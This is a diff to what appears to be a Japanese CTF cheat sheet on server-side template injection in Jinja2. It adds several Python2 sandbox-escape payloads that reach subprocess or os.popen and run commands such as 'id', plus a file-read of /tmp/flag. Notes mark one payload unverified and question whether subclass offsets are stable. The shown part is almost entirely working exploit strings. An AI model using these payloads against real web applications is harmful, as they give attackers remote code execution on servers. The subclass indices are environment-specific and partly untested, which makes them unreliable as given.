@@ -75,9 +75,19 @@ https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/README.md
 以下のtplmapよりも多くのほぼすべてのテンプレートエンジンの環境があって、しかも`exploit.py`もついてる！！神！！   
 ### jinja2
 (見やすくするために出力結果には適宜改行を入れてる。)   
-結局、Python2なら`<type 'file'>`を使った以下  
+結局、Python2なら以下  
+python2なら大体オフセット同じ気がするけど気のせい？？  
 ```txt
+<type 'file'>
 ''.__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read()
+
+<class 'warnings.catch_warnings'>
+"".__class__.__mro__[2].__subclasses__()[59].__repr__.__globals__.items()[13][1]["__import__"]("subprocess").check_output("echo AA", shell=True)
+''.__class__.__mro__[2].__subclasses__()[59].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("echo AA", shell=True)
+
+'os': <module 'os' from '/usr/local/lib/python3.9/os.py'>  未検証
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+session.__class__.__base__.get.__globals__['warnings']['sys']['modules']['os'].popen('id').read()
 ```
 python3ならこの`__subclasses__`経由ではfileは存在しないが、`<class 'warnings.catch_warnings'>`,`<class 'subprocess.Popen'>`を使って以下のようにしてRCE!  
 ```txt
